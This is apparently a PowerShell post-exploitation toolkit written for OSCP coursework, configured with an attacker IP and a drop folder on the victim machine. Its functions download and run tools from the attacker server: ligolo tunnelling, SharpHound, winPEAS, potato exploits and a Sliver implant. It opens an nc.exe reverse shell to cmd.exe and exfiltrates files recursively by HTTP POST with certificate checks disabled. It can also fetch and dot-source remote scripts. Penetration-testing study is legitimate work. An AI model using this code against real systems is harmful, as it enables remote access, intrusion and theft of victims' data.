<#
    .SYNOPSIS
    PowerShell Script Package for Security Operations during OSCP courseware and exam

    .DESCRIPTION
    This PowerShell script package is designed for various security operations including network reconnaissance, reverse shell establishment, data exfiltration, and system analysis. It provides a suite of functions to interact with a command and control (C2) server, execute reconnaissance tools, manage file exfiltration, and perform other essential tasks in penetration testing and cybersecurity assessments.

    .USAGE
    Use the `Show-Config` function to review the current configuration settings and the `Set-Config` function (if implemented) to adjust these settings accordingly.

    Functions within this package should be used in accordance with ethical guidelines and legal requirements. They are intended for authorized penetration testing, cybersecurity education, and defensive practice only.

    .NOTES
    Author: Jeamajoal
    Version: 1.0
    This script is provided "AS IS" without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the script or the use or other dealings in the script.

    Please ensure you have the appropriate permissions and authority before executing any scripts or functions within this package.
#>

function Global:Show-Config {
    Write-Host "Current Configuration:" -ForegroundColor Cyan
    Write-Host "Attacker IP: $Global:AttackerIP"
    Write-Host "Attacker Web Server: $Global:WebServerProtocol://$Global:AttackerIP:$Global:WebServerPort/$item"
    Write-Host "Toolbox Location on Victim Machine: $Global:ToolboxLocation"
}
function Global:Get-SingleToolboxItem {
    param (
        [string]$item,
        [string]$name 
    )
    if (-not $name)
    {
        $name = Split-Path $item -Leaf
    }
    Invoke-WebRequest -Uri "$Global:WebServerProtocol://$Global:AttackerIP:$Global:WebServerPort/$item" -OutFile "$Global:ToolboxLocation\$name"
}

function Global:Start-LigoloAgent {
    param (
        $ip = $Global:AttackerIP,
        $port = 11601
    )
    Set-Location $Global:ToolboxLocation
    Get-SingleToolboxItem -item 'tools/ligolo/ligolo_win_agent051.exe'
    & ./tools/ligolo/ligolo_win_agent051.exe -connect "$($ip):$($port)" -ignore-cert
}

function Global:Start-SharpHound {
    Set-Location $Global:ToolboxLocation
    Get-SingleToolboxItem -item 'enum/sharphound.exe'
    & ./enum/sharphound.exe --CollectionMethods All
}

function Global:Start-Shell {
    param (
    [string]$ip = $Global:AttackerIP,
    [string]$port,
    [string]$type = 'NC'
    )
    Set-Location $Global:ToolboxLocation
    $location = $Global:ToolboxLocation
    switch ($type) {
        'NC' { 
            Get-SingleToolboxItem -item 'tools/nc.exe'
            & "$location\tools\nc.exe" $ip $port -e cmd.exe
         }
         'Sliver' {
            Get-SingleToolboxItem -item 'tools/sliver8000.exe'
            & ./tools/sliver8000.exe
         }
    }
}

function Global:Start-AdEnum {
    Set-Location $Global:ToolboxLocation
    Get-SingleToolboxItem -item 'enum/adenumv2.ps1'
    Get-SingleToolboxItem -item 'enum/powerview.ps1'
    . ./enum/adenumv2.ps1
    . ./enum/powerview.ps1
    Get-AllObjectsFromAD
    Show-SimpleReport -Path $env:tmp -user $env:USERNAME -domain $script:DName
}

function Global:Start-Winpeas {
    Get-SingleToolboxItem -item 'privesc/winpeasx64.exe'
    & ./privesc/winpeasx64.exe
}

function Global:Get-potatos {
    Get-ToolboxItems -m potatos
    Get-ToolboxItems -m spoofer
}

function Global:Send-FilesHome {
    param (
        [string]$dir, #Base dir 
        [string]$url = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:AttackerPort)/",
        [switch]$recurse,
        [string]$filter = '*.*',
        [string]$id  = $env:computername #Alternate identifier for upload machine. Dirname on web server
    )

    $excluded = @('*.url','*.lnk')
    if ($recurse) {        
        $files = Get-ChildItem -Recurse -Path $dir -Filter $filter -ErrorAction SilentlyContinue -File -Exclude $excluded
        foreach ($f in $files) {
            Write-Host "Freeing... $($f.fullname)"
            UploadToWebServer -filepath $($f.FullName) -url $url -id $id
        }
    }
    else {
        $files = Get-ChildItem -Path $dir -Filter $filter -ErrorAction SilentlyContinue -File -Exclude $excluded
        foreach ($f in $files) {
            Write-Host "Freeing... $($f.fullname)"
            UploadToWebServer -filepath $($f.FullName) -url $url -id $id
        }
    }
}

function Global:UploadToWebServer {
    param (
        [Parameter(Mandatory = $true)]
        [Alias('f')]
        [string]$filepath,
        [Parameter(Mandatory = $false)]
        [Alias('u')]$url = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:AttackerPort)/"
    )
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } ;
    $filename = Split-Path $FilePath -Leaf
    $boundary = [System.Guid]::NewGuid().ToString()

    $TheFile = [System.IO.File]::ReadAllBytes($filePath)
    $TheFileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($TheFile)

    $id = $env:computername

    $LF = "`r`n"
    $bodyLines = (  
        "--$boundary",
        "Content-Disposition: form-data; name=`"path`"$LF",
        $(Split-Path $FilePath),
        "--$boundary",
        "Content-Disposition: form-data; name=`"id`"$LF",
        $id,
        "--$boundary",
        "Content-Disposition: form-data; name=`"filename`"; filename=`"$filename`"",
        "Content-Type: application/json$LF",
        $TheFileContent,
        "--$boundary--$LF"
    ) -join $LF

    Invoke-RestMethod $url -Method POST -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
}

function Get-FolderLinksRecursively {
    param (
        [string]$Url = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:AttackerPort)/"
    )
    $folders = @()
    if ($url -match '/$') {
        #url ends with slash
    }
    else {
        #add it
        $url = $url + '/'
    }
    do {
        $IterationCount++
        $parent = $null
        if ($FolderCount -gt 0) {
            $ScopedUrl = $($Url + $($folders[$IterationCount - 1]))
            $parent = ($ScopedUrl.Split('/', '4'))[3]
            $response = Invoke-WebRequest -Uri $ScopedUrl -UseBasicParsing
        }
        else {
            $response = Invoke-WebRequest -Uri $Url -UseBasicParsing
        }
        $folderLinks = $response.Links.href | Where-Object { $_ -match '/$' }
        if ($folderLinks) {
            foreach ($f in $folderLinks) {
                $folders += $parent + $f
                $FolderCount++
            }
        }
    }
    while ($IterationCount -lt $FolderCount)
    Return $folders
}

function Get-FileLinks {
    param (
        [string]$Url = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:AttackerPort)/"
    )

    $FQDNFileLinks = @()

    if ($url -match '/$') {
        #url ends with slash
    }
    else {
        #add it
        $url = $url + '/'
    }
    $response = Invoke-WebRequest -Uri $Url -UseBasicParsing
    $fileLinks = $response.Links.href | Where-Object { $_ -notmatch '/$' }
    if ($fileLinks) {
        foreach ($f in $fileLinks) {
            $FQDNFileLinks += $Url + $f
        }
    }
    Return $FQDNFileLinks
}

function Global:Get-ToolboxItems {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $false)]
        [Alias('u')]
        [string]$baseUrl = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:AttackerPort)/",

        [Parameter(Mandatory = $true)]
        [Alias('m')]
        [string]$matchString,
        
        [Parameter(Mandatory = $false)]
        [Alias('o')]
        [string]$outpath = './',

        [Parameter(Mandatory = $false)]
        [Alias('e')]
        [switch]$ExecutePS
        )
	
        if ($baseUrl -match '/$') {
            #url ends with slash
        }
        else {
            #add it
            $baseUrl = $baseUrl + '/'
        }
	
        # Initialize an empty list to store links.
        $fileLinks = @()
	
        # Start the recursive link gathering process.
        $folderlinks = Get-FolderLinksRecursively -Url $baseUrl
	
        foreach ($link in $folderlinks) {
            $url = $baseUrl + $link
            $fileLinks += Get-FileLinks -Url $url
        }
	
        if ($fileLinks) {
            foreach ($link in $fileLinks) {
                if ($link -match $matchString) {
                    $fileName = Split-Path $link -leaf
                    $outputpathchild = $link.replace($baseUrl, '')
                    $finaloutputpath = $outpath + $($outputpathchild.replace($fileName, ''))
                				
                    #Create Downlod Directory
                    If (-not (Test-Path $finaloutputpath)) {
                        New-Item -Type Directory -Path $finaloutputpath -Force | Out-Null
                    }
                    # Download the file.
                    Invoke-WebRequest -Uri $link -OutFile $($finaloutputpath + $fileName) -UseBasicParsing
                    Write-Host "Downloaded: $filename to $finaloutputpath"
                    
                    If ($ExecutePS) {
                        $scriptLocation = $($finaloutputpath + $fileName)
                        #Source only if powershell
                        If ($filename -match '\.ps1$') {
                            # Fetch the script content
                            
                            $scriptContent = Get-Content $($finaloutputpath + $fileName) -Raw
                            # Use regex to find all function names
                            $functionNames = @()
                            $functionNames += [regex]::Matches($scriptContent, '(?m)^function\s+([a-zA-Z0-9_\-]+)') | ForEach-Object {
                                $_.Groups[1].Value
                            }
                            $functionNames = $functionNames | Sort-Object -Unique

                            # Display the function names
                            Write-Host "File: $filename"
                            Write-Host "---Functions--"
                            $functionNames | ForEach-Object { Write-Host $_ }
                            Write-Host "--------------"
                            Write-Host ""

                            . $scriptLocation
                        }
                    }
                }
            }
        }
        else {
		
        }
    }

# Check if global IP and port are set, otherwise prompt for them
if (-not $Global:AttackerIP) {
    $Global:AttackerIP = Read-Host "Enter the attacker's IP address"
}
if (-not $Global:WebServerPort) {
    $Global:WebServerPort = Read-Host "Enter the web server port number"
}
if (-not $Global:WebServerProtocol)
{
    $isSecure = Read-Host "Will the web server be secure? [N] (Y/N)"
    $isSecure = $(($isSecure.ToUpper()) -eq 'Y' -or $($isSecure.ToUpper()) -eq 'YES')
    if ($isSecure)
    {
        $Global:WebServerProtocol = 'https'
    }
    else
    {
        $Global:WebServerProtocol = 'http'
    }
}
if (-not $Global:ToolboxLocation) {
    $loc = Read-Host "Enter the directory to store Toolbox items in on victim machine. [C:\users\public] "
    if ($loc)
    {
        $Global:ToolboxLocation = $loc
    }
    else {
        $Global:ToolboxLocation = 'C:\users\public'
    }

}
    Set-Alias -Name gti -Value Get-ToolBoxItems
    Set-Alias -Name upload -Value UploadToWebServer
    Set-Alias -Name exfil -Value Send-FilesHome